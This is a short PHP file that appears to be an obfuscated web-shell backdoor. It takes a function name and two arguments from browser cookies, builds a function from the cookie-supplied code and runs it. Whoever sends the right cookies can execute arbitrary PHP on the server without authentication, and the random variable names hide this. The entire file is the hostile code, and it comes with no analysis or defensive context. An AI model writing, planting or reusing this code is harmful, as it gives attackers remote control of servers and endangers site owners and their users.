<?php

$dnv=$_COOKIE;
$wmirn=$dnv[akdo];
if($wmirn){
	$snmt=$wmirn($dnv[hrso]);$drjoh=$wmirn($dnv[btxp]);$rqc=$snmt("",$drjoh);$rqc();
}